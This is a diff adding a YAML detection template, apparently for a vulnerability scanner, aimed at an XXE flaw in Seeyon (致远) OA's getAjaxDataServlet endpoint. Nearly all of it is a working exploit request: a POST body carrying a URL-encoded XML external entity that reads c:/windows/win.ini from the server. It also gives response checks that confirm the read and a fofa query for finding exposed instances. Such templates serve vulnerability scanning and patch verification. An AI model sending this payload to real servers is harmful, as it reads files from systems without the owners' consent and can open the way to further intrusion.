@@ -1,0 +1,26 @@
+id: seeyon-getajaxdataservlet-xxe
+
+info:
+  name: 致远OA getAjaxDataServlet XXE
+  author: Wen
+  severity: critical
+  verified: true
+  description: |
+    fofa: app="致远互联-OA"
+  tags: seeyon,oa,xxe
+  created: 2024/01/12
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /seeyon/m-signature/RunSignature/run/getAjaxDataServlet
+      body: |
+        S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E
+    expression: |
+      (response.status == 200 || response.status == 206) &&
+      response.body.ibcontains(b"[fonts]") &&
+      response.body.ibcontains(b"[extensions]")
+expression: r0()
